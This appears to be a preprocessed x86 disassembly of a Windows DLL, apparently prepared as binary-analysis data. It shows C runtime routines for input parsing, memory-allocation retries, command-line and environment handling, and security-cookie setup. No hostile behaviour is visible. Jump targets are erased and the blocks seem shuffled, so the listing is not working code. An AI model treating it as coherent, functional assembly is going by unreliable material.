jne r-xdata
test bl bl
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_10014972
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp eax 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
mov edi [ ebp - 0x1c0 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
mov bl 0x1
jmp r-xdata
dec [ ebp - 0x18c ]
push edi
push eax
call sub_10014988
pop ecx
pop ecx
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
cmp [ ebp - 0x1c0 ] esi
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x69
je r-xdata
cmp [ ebp - 0x1a4 ] 0x46
jne r-xdata
neg edi
movzx eax [ ebp - 0x188 ]
push eax
call sub_1001a3b9
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1c8 ] ecx
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_1001a3b9
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x1a4 ] 0x73
jne r-xdata
push 0x30
pop esi
cmp [ ebp - 0x188 ] esi
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc edi
cmp [ edi ] 0x5e
mov esi edi
jne r-xdata
mov [ ebp - 0x19e ] 0x1
mov edi [ ebp - 0x1b8 ]
inc [ ebp - 0x19d ]
inc edi
mov [ ebp - 0x1b8 ] edi
jmp r-xdata
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1a4 ] edx
cmp eax 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014988
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl edi 0x4
call sub_10014952
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_1001a335
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014988
pop ecx
pop ecx
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
push [ ebp - 0x188 ]
shld edi esi 0x4
shl esi 0x4
call sub_10014952
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_1001a335
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x1c4 ]
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
inc [ ebp - 0x1c0 ]
jmp r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1000ebe0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x1 ]
mov [ ebp - 0x19f ] 0xff
cmp [ ebp - 0x1b4 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x196 ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_100183f8
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x19f ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov bl 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov esi [ ebp - 0x1bc ]
imul edi edi 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c8 ]
push [ ebp - 0x1cc ]
call sub_1001a2b0
mov esi eax
mov edi edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1e8 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_10019fd2
mov ax [ ebp - 0x1e8 ]
add esp 0x10
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_10014972
mov [ ebp - 0x1df ] al
mov [ ebp - 0x1a4 ] 0x78
jmp r-xdata
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
cmp [ ebp - 0x1a4 ] 0x78
mov [ ebp - 0x1a8 ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_1001a335
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1cc ]
mov [ esi ] eax
mov eax [ ebp - 0x1c8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1b4 ] 0x0
mov eax [ ebp - 0x188 ]
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] edi
je r-xdata
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
mov [ ebp - 0x1bc ] esi
jmp r-xdata
inc bl
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push eax
call sub_10014988
pop ecx
pop ecx
mov [ ebp - 0x188 ] esi
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19f ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1a4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov [ ebp - 0x1b8 ] esi
mov esi [ ebp - 0x1bc ]
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1ac ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
inc bl
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014988
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19f ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1ac ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x1f8 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_1001a335
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_1001a335
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100148fb
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
mov [ ebp - 0x188 ] eax
movzx eax al
sub_10015982
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000cef2
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_100159c7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a559
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10015a13
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d6b9
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10015a61
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a677
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10015ab3
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1000f74d
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_100159c7
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10014870
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10014870
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_1000c3e9
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_100159c7
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000c3e9
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1001830b
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100101bf
add esp 0x14
sub_10015b91
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1001304c
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1001304c
pop ecx
test eax eax
je r-xdata
call sub_1001304c
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_10015d2b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1000f74d
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10015b91
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10015982
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10015b91
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10015de6
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_10015982
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_10015982
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_10013da0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1000c3e9
pop ecx
mov [ ebp - 0x4 ] ebx
sub_10015f1d
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10015f43
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10015f6a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1000fcde
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_100160ca
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_10015f6a
pop ecx
pop ecx
pop ebp
retn
sub_100160ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
